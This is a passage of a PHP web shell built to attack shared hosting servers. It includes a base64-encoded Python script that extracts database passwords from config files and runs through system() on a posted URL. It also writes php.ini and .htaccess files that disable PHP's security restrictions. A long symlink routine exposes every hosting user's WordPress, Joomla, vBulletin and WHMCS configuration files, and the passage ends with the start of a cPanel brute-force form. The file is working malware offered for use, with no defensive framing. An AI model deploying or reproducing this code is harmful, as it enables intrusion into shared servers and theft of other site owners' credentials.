ogIHByaW50ICdcbicsICctJyAqIDEwMCwgJ1xuJw0KICBpZiBzeXN0ZW0oKSA9PSAnTGludXgnOg0KICAgIGZvciByb290LCBkaXJzLCBmaWxlcyBpbiBvcy53YWxrKGZvdXQpOg0KICAgICAgZm9yIGZuYW1lIGluIGZpbGVzOg0KICAgICAgICBmdWxscGF0aCA9IG9zLnBhdGguam9pbihyb290LCBmbmFtZSkNCiAgICAgICAgZiA9IG9wZW4oZnVsbHBhdGgsICdyJykNCiAgICAgICAgZm9yIGxpbmUgaW4gZjoNCiAgICAgICAgICBzZWNyID0gcmUuc2VhcmNoIChyIihkYl9wYXNzd29yZCddID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICAgIGlmIHNlY3IgaXMgbm90IE5vbmU6IHByaW50IChzZWNyLmdyb3VwKDIpKSAgDQogICAgICAgICAgc2VjcjEgPSByZS5zZWFyY2gociIocGFzc3dvcmQgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjEgaXMgbm90IE5vbmU6ICBwcmludCAgKHNlY3IxLmdyb3VwKDIpKQ0KICAgICAgICAgIHNlY3IyID0gcmUuc2VhcmNoKHIiKERCX1BBU1NXT1JEJykoLi4uKSguK1tePl0pKCcpIiwgbGluZSkNCiAgICAgICAgICBpZiBzZWNyMiBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3IyLmdyb3VwKDMpKQ0KICAgICAgICAgIHNlY3IzID0gcmUuc2VhcmNoIChyIihkYnBhc3MgPS4uKSguK1tePl0pKC47KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjMgaXMgbm90IE5vbmU6IHByaW50IChzZWNyMy5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNCA9IHJlLnNlYXJjaCAociIoREJQQVNTV09SRCA9ICcpKC4rW14+XSkoLjspIiwgbGluZSkNCiAgICAgICAgICBpZiBzZWNyNCBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I0Lmdyb3VwKDIpKQ0KICAgICAgICAgIHNlY3I1ID0gcmUuc2VhcmNoIChyIihEQnBhc3MgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjUgaXMgbm90IE5vbmU6IHByaW50IChzZWNyNS5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNiA9IHJlLnNlYXJjaCAociIoZGJwYXNzd2QgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjYgaXMgbm90IE5vbmU6IHByaW50IChzZWNyNi5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNyA9IHJlLnNlYXJjaCAociIobW9zQ29uZmlnX3Bhc3N3b3JkID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICAgIGlmIHNlY3I3IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjcuZ3JvdXAoMikpDQogICAgICAgIGYuY2xvc2UoKQ0KICBpZiBzeXN0ZW0oKSA9PSAnV2luZG93cyc6DQogICAgZm9yIGluZmlsZSBpbiBnbG9iLmdsb2IoIG9zLnBhdGguam9pbihmb3V0LCAnKi50eHQnKSApOg0KICAgICAgZiA9IG9wZW4oaW5maWxlLCAncicpDQogICAgICBmb3IgbGluZSBpbiBmOg0KICAgICAgICBzZWNyID0gcmUuc2VhcmNoIChyIihkYl9wYXNzd29yZCddID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyIGlzIG5vdCBOb25lOiBwcmludCAoc2Vjci5ncm91cCgyKSkgIA0KICAgICAgICBzZWNyMSA9IHJlLnNlYXJjaChyIihwYXNzd29yZCA9ICcpKC4rW14+XSkoJzspIiwgbGluZSkNCiAgICAgICAgaWYgc2VjcjEgaXMgbm90IE5vbmU6ICBwcmludCAgKHNlY3IxLmdyb3VwKDIpKQ0KICAgICAgICBzZWNyMiA9IHJlLnNlYXJjaChyIihEQl9QQVNTV09SRCcpKC4uLikoLitbXj5dKSgnKSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3IyIGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjIuZ3JvdXAoMykpDQogICAgICAgIHNlY3IzID0gcmUuc2VhcmNoIChyIihkYnBhc3MgPS4uKSguK1tePl0pKC47KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3IzIGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjMuZ3JvdXAoMikpDQogICAgICAgIHNlY3I0ID0gcmUuc2VhcmNoIChyIihEQlBBU1NXT1JEID0gJykoLitbXj5dKSguOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyNCBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I0Lmdyb3VwKDIpKQ0KICAgICAgICBzZWNyNSA9IHJlLnNlYXJjaCAociIoREJwYXNzID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyNSBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I1Lmdyb3VwKDIpKQ0KICAgICAgICBzZWNyNiA9IHJlLnNlYXJjaCAociIoZGJwYXNzd2QgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3I2IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjYuZ3JvdXAoMikpDQogICAgICAgIHNlY3I3ID0gcmUuc2VhcmNoIChyIihtb3NDb25maWdfcGFzc3dvcmQgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3I3IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjcuZ3JvdXAoMikpDQogICAgICBmLmNsb3NlKCkNCmV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQpOg0KICBwcmludCAnXG5UaGFua3MgZm9yIHVzaW5nIGl0IC5fXic=';
$file = fopen("cp.py","w+");
$write = fwrite ($file ,base64_decode($cp));
fclose($file);
chmod("cp.py",0755);
$url = $_POST['url'];
echo"<center>
<textarea cols=\"90\" rows=\"20\" name=\"usernames\">";
system("python cp.py $url config");
unlink ('cp.py');
echo"</textarea>
</center>";
echo "<hr><center><b><a href=".$_SERVER['PHP_SELF'].">BACK</a>";
exit;
}
if($_POST['matikan']=='sekatan'){
@error_reporting(0);
$phpini =
'c2FmZV9tb2RlPU9GRg0KZGlzYWJsZV9mdW5jdGlvbnM9Tk9ORQ==';
$file = fopen("php.ini","w+");
$write = fwrite ($file ,base64_decode($phpini));
fclose($file);
$htaccess =
'T3B0aW9ucyBGb2xsb3dTeW1MaW5rcyBNdWx0aVZpZXdzIEluZGV4ZXMgRXhlY0NHSQ==';
$file = fopen(".htaccess","w+");
$write = fwrite ($file ,base64_decode($htaccess));
echo "<hr><center><b>DONE!";
echo "<hr><center><b><a href=".$_SERVER['PHP_SELF'].">BACK</a>";
exit;
}
if($_POST['mendapatkan']=='passwd'){
@set_magic_quotes_runtime(0);
ob_start();
error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
$fn = $_POST['foldername'];
//all function here

function syml($usern,$pdomain)
	{
		symlink('/home/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home2/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home2/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home2/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home2/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home2/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home2/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home2/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home2/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home2/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home2/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home2/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home2/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home2/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home2/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home2/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home2/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home2/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home2/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home2/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home2/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home2/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home2/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home2/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home2/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home2/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home2/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home3/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home3/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home3/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home3/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home3/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home3/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home3/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home3/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home3/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home3/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home3/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home3/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home3/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home3/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home3/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home3/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home3/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home3/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home3/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home3/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home3/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home3/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home3/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home3/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home3/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home3/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home4/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home4/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home4/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home4/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home4/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home4/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home4/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home4/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home4/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home4/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home4/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home4/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home4/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home4/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home4/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home4/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home4/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home4/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home4/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home4/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home4/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home4/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home4/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home4/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home4/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home4/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home5/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home5/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home5/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home5/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home5/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home5/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home5/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home5/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home5/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home5/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home5/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home5/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home5/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home5/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home5/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home5/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home5/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home5/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home5/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home5/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home5/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home5/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home5/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home5/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home5/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home5/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home6/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home6/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home6/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home6/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home6/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home6/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home6/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home6/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home6/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home6/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home6/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home6/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home6/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home6/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home6/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home6/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home6/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home6/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home6/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home6/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home6/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home6/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home6/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home6/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home6/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home6/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home7/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home7/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home7/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home7/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home7/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home7/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home7/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home7/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home7/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home7/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home7/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home7/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home7/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home7/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home7/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home7/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home7/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home7/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home7/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home7/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home7/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home7/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home7/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home7/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home7/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home7/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
	}

				$d0mains = @file("/etc/named.conf");
		
				if($d0mains)
				{
					mkdir($fn);
					chdir($fn);
										
					foreach($d0mains as $d0main)
					{
						if(eregi("zone",$d0main))
						{
							preg_match_all('#zone "(.*)"#', $d0main, $domains);
							flush();
								
							if(strlen(trim($domains[1][0])) > 2)
							{ 
								$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
								
								syml($user['name'],$domains[1][0]);					
							}
						}
					}
					echo "<center><font color=lime size=3>[ Done ]</font></center>";
					echo "<br><center><a href=$fn/ target=_blank><font size=3 color=#009900>| Go Here |</font></a></center>"; 
				}
				else
				{
					mkdir($fn);
					chdir($fn);
					$temp = "";
					$val1 = 0;
					$val2 = 1000;
					for(;$val1 <= $val2;$val1++) 
					{
						$uid = @posix_getpwuid($val1);
						if ($uid)
							$temp .= join(':',$uid)."\n";
					 }
					 echo '<br/>';
					 $temp = trim($temp);
					 
					 $file5 = fopen("test.txt","w");
					 fputs($file5,$temp);
					 fclose($file5);

$htaccess =
'T3B0aW9ucyBhbGwgCkRpcmVjdG9yeUluZGV4IHJlYWRtZS5odG1sIApBZGRUeXBlIHRleHQvcGxh
aW4gLnBocCAKQWRkSGFuZGxlciBzZXJ2ZXItcGFyc2VkIC5waHAgCkFkZFR5cGUgdGV4dC9wbGFp
biAuaHRtbCAKQWRkSGFuZGxlciB0eHQgLmh0bWwgClJlcXVpcmUgTm9uZSAKU2F0aXNmeSBBbnk=
';
$file = fopen(".htaccess","w+");
$write = fwrite ($file ,base64_decode($htaccess));
					 
					 $file = fopen("test.txt", "r") or exit("Unable to open file!");
					 while(!feof($file))
					 {
						$s = fgets($file);
						$matches = array();
						$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
						$matches = str_replace("home/","",$matches[1]);
						if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
							continue;
						syml($matches,$matches);
					 }
					fclose($file);
					echo "</table>";
					unlink("test.txt");
					echo "<center><font color=lime size=3>[ Done ]</font></center>";
					echo "<br><center><a href=$fn/ target=_blank><font size=3 color=#009900>| Go Here |</font></a></center>"; 
				}
echo "<hr><center><b><a href=".$_SERVER['PHP_SELF'].">BACK</a>";
exit;
}
?>
<form method="POST" target="_blank">
	<strong>
<input name="page" type="hidden" value="find"><table>      				
    </strong><br><br><center><font size="5" style="italic" color="#00ff00">Cpanel BruteForce</font></center><br><br>
    <table width="600" border="0" cellpadding="3" cellspacing="1" align="center">
	<tr>
	<td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
	<center><b><font size="5" style="italic" color="#00ff00">Cpanel BruteForce</font></b></center></td></tr>
    <tr>
    <td>
    <table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
